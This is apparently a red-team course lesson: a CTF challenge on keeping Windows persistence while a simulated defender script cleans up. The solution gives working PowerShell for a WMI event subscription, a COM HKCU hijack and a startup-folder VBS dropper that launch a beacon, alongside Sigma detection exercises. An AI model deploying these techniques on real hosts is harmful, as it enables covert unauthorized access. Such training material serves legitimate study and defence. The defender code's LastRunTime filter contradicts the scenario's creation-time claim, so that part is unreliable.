---
title: "Red Team CTF Sprint — Day 5: Persistence and Evasion Under Detection"
tags: [red-team, CTF, persistence, WMI-subscription, COM-hijacking, EDR-evasion,
  AMSI, ETW, detection, T1546.003, T1546.015, T1562.001, sprint, advanced,
  challenge, blue-team-awareness]
module: 08-RedTeam-03
day: 555
related_topics:
  - Red Team CTF Sprint Day 4 (Day 554)
  - Advanced Persistence WMI (Day 531)
  - COM Hijacking (Day 532)
  - Advanced Persistence Lab (Day 533)
  - EDR Evasion (Day 541)
  - Red Team CTF Sprint Day 6 (Day 556)
---

# Day 555 — Red Team CTF Sprint: Day 5

> "Anyone can get persistence in an empty room. The test is whether you can
> maintain it while someone is actively looking for you. This challenge runs a
> defender simulation in parallel. You are not just writing persistence — you
> are writing persistence that survives a blue team response."
>
> — Ghost

---

## Goals

Establish multiple persistence mechanisms on a lab host while evading a
simulated defender script that scans for common persistence artefacts.
Understand which persistence mechanisms survive blue team discovery and cleanup.
Write a detection rule for the persistence technique that survived the longest.

**Prerequisites:** Days 531–533 (WMI persistence, COM hijacking, persistence
lab), Day 541 (EDR evasion, AMSI bypass).
**Time budget:** 5 hours (single extended challenge with phases).

---

## Challenge — Ghost in the Machine

### Category
Persistence / Defence Evasion

### Difficulty
Advanced
Estimated time: 4 hours for a student at target level

### Learning Objective
Deploy three different persistence mechanisms on a Windows host while a
simulated blue team script runs every 10 minutes scanning for common
persistence artefacts. Maintain at least one active persistence after two
full scan cycles. Retrieve the flag only after maintaining access through
one clean-up event.

### Scenario

```
You have initial access to WORKSTATION-05 (10.10.10.80) as a local
administrator via the credentials recovered in Day 554 (or given as:
localadmin / LocalAdmin2024!).

The "Defender Simulation" script (running as SYSTEM every 10 minutes) does:
  → Checks WMI Event Subscriptions: queries __EventFilter, __EventConsumer,
    __FilterToConsumerBinding namespaces and removes any created after the
    last clean state.
  → Checks HKCU\Software\Microsoft\Windows\CurrentVersion\Run for new entries.
  → Checks Task Scheduler for tasks created in the last 24 hours and removes
    any not in an approved list.
  → Does NOT check: COM HKCU overrides, DLL search-order hijacks,
    scheduled tasks with creation dates older than 24 hours (it only checks
    creation time, not content), or startup folder entries.

The flag is delivered by the SYSTEM script: after each cleanup cycle, if any
persistence mechanism successfully fires (i.e., your beacon calls back), the
script drops flag.txt to C:\Flags\.

Your C2 is already running on the attack host (Sliver or equivalent).
Your beacon is a small executable at C:\Windows\Temp\beacon.exe (pre-staged).
Goal: ensure beacon.exe executes automatically after each cleanup cycle.
```

### Vulnerability / Technique
T1546.003 — Event Triggered Execution: Windows Management Instrumentation
T1546.015 — Event Triggered Execution: Component Object Model Hijacking
T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
T1562.001 — Impair Defenses: Disable or Modify Tools

### Setup

```powershell
# Defender simulation script — runs every 10 minutes as a scheduled task
# (pre-configured on the lab host — student cannot remove it)

# scanner.ps1 (runs as SYSTEM):
$clean_wmi = @(
    "Get-WMIObject -Namespace root\subscription -Class __EventFilter",
    "Get-WMIObject -Namespace root\subscription -Class __EventConsumer",
    "Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding"
)
foreach ($q in $clean_wmi) {
    Invoke-Expression $q | Remove-WMIObject
}

# Remove Run keys added after clean state:
$approved_run_keys = @("SecurityHealth", "OneDrive")
$run_keys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
foreach ($key in $run_keys.PSObject.Properties) {
    if ($key.Name -notin $approved_run_keys) {
        Remove-ItemProperty -Path HKCU:\Software\...\Run -Name $key.Name
    }
}

# Remove new scheduled tasks (created in last 24h, not in approved list):
$approved_tasks = @("MicrosoftEdgeUpdateTaskMachineCore",
    "GoogleUpdateTaskMachineCore", "OneDrive Reporting Task")
Get-ScheduledTask | Where-Object {
    $_.TaskName -notin $approved_tasks -and
    (Get-ScheduledTaskInfo -TaskName $_.TaskName).LastRunTime -gt (Get-Date).AddHours(-24)
} | Unregister-ScheduledTask -Confirm:$false

# Drop flag if any persistence fired (beacon call-back detected):
if (Test-Path C:\Windows\Temp\beacon_active.flag) {
    Copy-Item C:\Flags\flag_template.txt C:\Flags\flag.txt
    Remove-Item C:\Windows\Temp\beacon_active.flag
}
```

### Hint Progression
1. Read the defender script carefully. It tells you exactly what it checks
   and exactly what it ignores. Work with the gaps.
2. COM hijacking via HKCU does not require elevation and is not cleaned by
   the defender script. Which COM object fires frequently enough to
   reliably call your beacon?
3. A scheduled task with a creation date in the past (not last 24 hours)
   passes the defender's age filter. How might you modify the task's
   creation timestamp? Or — is there an approved task you could modify?

### Solution Walkthrough

```powershell
# ════════════════════════════════════════════
# PHASE 1: Deploy three persistence mechanisms
# ════════════════════════════════════════════

# Connect via evil-winrm:
proxychains evil-winrm -i 10.10.10.80 -u localadmin -p 'LocalAdmin2024!'

# --- Mechanism 1: WMI Event Subscription (will be cleaned — test only) ---
# Deploy for the first scan cycle to see if it fires before cleanup:
$FilterArgs = @{
    Name = 'WindowsHealthMonitor'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_Process"'
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'WindowsHealthConsumer'
    CommandLineTemplate = 'C:\Windows\Temp\beacon.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
Write-Host "[+] WMI subscription deployed (will survive until first scan)"

# --- Mechanism 2: COM Hijacking — HKCU override of a frequently-used COM object ---
# Target: {7C857801-7381-11CF-884D-00AA004B2E24} = WScript.Shell — called by many apps

$clsid = '{7C857801-7381-11CF-884D-00AA004B2E24}'
$hive = "HKCU:\Software\Classes\CLSID\$clsid"
New-Item -Path "$hive\InprocServer32" -Force | Out-Null
Set-ItemProperty -Path "$hive\InprocServer32" -Name '(Default)' `
    -Value 'C:\Windows\Temp\persistence.dll'
Set-ItemProperty -Path "$hive\InprocServer32" -Name 'ThreadingModel' `
    -Value 'Apartment'

# persistence.dll: a DLL that drops beacon.exe and executes it on load
# (pre-staged in lab — build with msfvenom or custom C DLL loader)
Write-Host "[+] COM HKCU hijack deployed — survives cleanup"

# --- Mechanism 3: Startup folder (also not cleaned by the defender) ---
$startup = [Environment]::GetFolderPath('Startup')
# Create a VBS dropper that executes beacon:
$vbs = @'
Set oShell = CreateObject("WScript.Shell")
oShell.Run "C:\Windows\Temp\beacon.exe", 0, False
'@
$vbs | Out-File "$startup\WindowsSetupHelper.vbs" -Encoding ASCII
Write-Host "[+] Startup VBS dropper deployed"

# ════════════════════════════════════════════
# PHASE 2: Wait for defender scan (10 minutes)
# ════════════════════════════════════════════

# After 10 minutes: defender script runs
# WMI subscription: CLEANED (expected)
# Run keys: none added, nothing to clean
# COM HKCU: NOT cleaned — SURVIVES
# Startup VBS: NOT cleaned — SURVIVES

# If beacon called back before cleanup: flag.txt will appear in C:\Flags\

# ════════════════════════════════════════════
# PHASE 3: Verify surviving persistence
# ════════════════════════════════════════════

# Check what survived after first cleanup:
*Evil-WinRM* PS> Get-ItemProperty "HKCU:\Software\Classes\CLSID\{7C857801-7381-11CF-884D-00AA004B2E24}\InprocServer32"
# → still present → COM hijack survived

*Evil-WinRM* PS> dir $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\
# → WindowsSetupHelper.vbs still present → startup survived

# ════════════════════════════════════════════
# PHASE 4: Retrieve flag after second cycle
# ════════════════════════════════════════════

*Evil-WinRM* PS> dir C:\Flags\
# flag.txt should appear after beacon calls back and defender drops it
*Evil-WinRM* PS> type C:\Flags\flag.txt
# FLAG: CTF{persistence_that_survives_the_blue_team}
```

### Flag
`CTF{persistence_that_survives_the_blue_team}`

### Detection Writing Exercise

```
Write three Sigma rules — one for each persistence mechanism.
The rule must catch the mechanism without generating more than 10 false
positives per day in a standard corporate environment.

Rule 1 — WMI Event Subscription:
  Target event: Sysmon Event ID 19 (WmiEventFilter created)
  Filter out: legitimate AV and endpoint management subscriptions
  _______________________________________________________________

Rule 2 — COM HKCU hijack:
  Target event: Sysmon Event ID 13 (Registry value set) under
    HKCU\Software\Classes\CLSID\*\InprocServer32
  Filter out: none — legitimate apps rarely modify this path
  _______________________________________________________________

Rule 3 — Startup folder new file:
  Target event: Sysmon Event ID 11 (File created) in the Startup path
  Filter out: known-good applications that self-install to Startup
  _______________________________________________________________

Fill in your Sigma rule YAML below:
```

### Debrief Points

```
1. The defender simulation demonstrates a fundamental principle: a blue team
   that only checks for known-bad artefacts loses to a red team that reads
   their detection logic and chooses a persistence mechanism they miss.
   Detection must be comprehensive, not just common.

2. COM HKCU hijacking requires no elevation. It fires reliably when the
   hijacked COM object is instantiated by a legitimate application —
   which is why the choice of target CLSID matters. High-frequency CLSIDs
   (used by Explorer, Office, browsers) fire every login.

3. The startup folder is a classic persistence location. Its advantage is
   simplicity. Its disadvantage is that it only fires at user login —
   a server with no interactive logins never triggers startup folder items.
   Choose the persistence trigger based on the target's usage patterns.

4. All three mechanisms produce Sysmon events if Sysmon is configured.
   The defender's weakness in this challenge is not Sysmon — it is the
   automated cleanup that only checks specific things. Real defenders
   need both detection (alerts) and response (action) — cleaning
   only what you know about is security by checklist.

5. Post-exercise: read the defender script again with fresh eyes.
   What would you check that it does not? This is how you build better
   blue team tooling.
```

---

## Engagement Log — Day 5 Sprint

```
Time    | Action                                          | Result
--------|-------------------------------------------------|-------
        | evil-winrm connected to WORKSTATION-05          |
        | WMI subscription deployed                       |
        | COM HKCU hijack deployed                        |
        | Startup VBS deployed                            |
        | First defender scan cycle (10 min)              |
        | WMI cleaned (expected)                          |
        | COM + Startup survived confirmed                |
        | Beacon callback confirmed                       |
        | Second scan cycle passed                        |
        | Flag retrieved                                  |

Detection rules written: [ ] WMI  [ ] COM  [ ] Startup
Flag captured: [ ] Yes  [ ] No
Total time: _____ minutes
Surviving mechanisms: _____ / 3
```

---

## Key Takeaways

1. Persistence that survives cleanup requires understanding the cleanup
   mechanism. Reading the defender's detection logic — whether a script,
   a SIEM rule, or a documented IR playbook — is the first step in choosing
   a mechanism they will miss.
2. COM HKCU hijacking is detection-light because it uses legitimate registry
   paths that many applications write to. The signal is subtle: the new
   value points to an unexpected DLL path rather than a system path.
3. Writing the detection rule immediately after executing the attack is the
   Ghost Method's "Detect" stage. If you cannot write the rule that would
   catch you, you do not fully understand what you just did.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q555.1, Q555.2 …).

---

## Navigation

← Previous: [Day 554 — Red Team CTF Sprint: Day 4](DAY-0554-Red-Team-CTF-Sprint-Day-4.md)
→ Next: [Day 556 — Red Team CTF Sprint: Day 6](DAY-0556-Red-Team-CTF-Sprint-Day-6.md)
